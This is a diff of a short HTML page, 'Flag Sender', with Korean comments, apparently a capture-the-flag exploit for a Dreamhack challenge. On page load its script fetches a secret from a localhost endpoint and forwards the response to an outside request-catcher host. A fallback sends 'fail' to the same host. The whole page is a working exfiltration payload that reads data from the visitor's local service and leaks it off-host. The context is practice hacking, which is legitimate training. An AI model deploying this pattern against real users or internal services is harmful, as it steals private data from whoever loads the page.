@@ -6,24 +6,34 @@
     <title>Flag Sender</title>
 </head>
 <body>
-    <h1>Flag Sender22232423423422</h1>
+    <h1>Flag Sender</h1>
     <script>
         const baseFlag = 'hspace'; // 고정된 FLAG 부분
 
         const sendFlag = async () => {
-            const requestUrl = `http://localhost/flag?flag=${baseFlag}`;
+            const requestUrl = `https://localhost/flag?flag=${encodeURIComponent(baseFlag)}`;
 
-            const response = await fetch(requestUrl);
-            const text = await response.text();
+            try {
+                const response = await fetch(requestUrl);
+                const text = await response.text();
 
-            console.log(`Requesting: ${requestUrl}`); // 요청 로그
-            console.log(`Response: ${text}`); // 응답 로그
+                console.log(`Requesting: ${requestUrl}`); // 요청 로그
+                console.log(`Response: ${text}`); // 응답 로그
 
-            // 최종 요청 보내기 (응답 text를 파라미터로 사용)
-            const finalRequestUrl = `https://lyszjex.request.dreamhack.games?flag=${text}`;
-            fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
+                // 최종 요청 보내기 (응답 text를 파라미터로 사용)
+                const finalRequestUrl = `https://nswmtml.request.dreamhack.games?flag=${encodeURIComponent(text)}`;
+                fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
 
-            console.log('Final FLAG sent:', text);
+                console.log('Final FLAG sent:', text);
+            } catch (error) {
+                console.error('Fetch failed:', error);
+
+                // 요청 실패 시 최종 요청 보내기 (fail 파라미터)
+                const finalRequestUrl = `https://lyszjex.request.dreamhack.games?flag=fail`;
+                fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
+
+                console.log('Final FLAG sent: fail');
+            }
         };
 
         sendFlag();
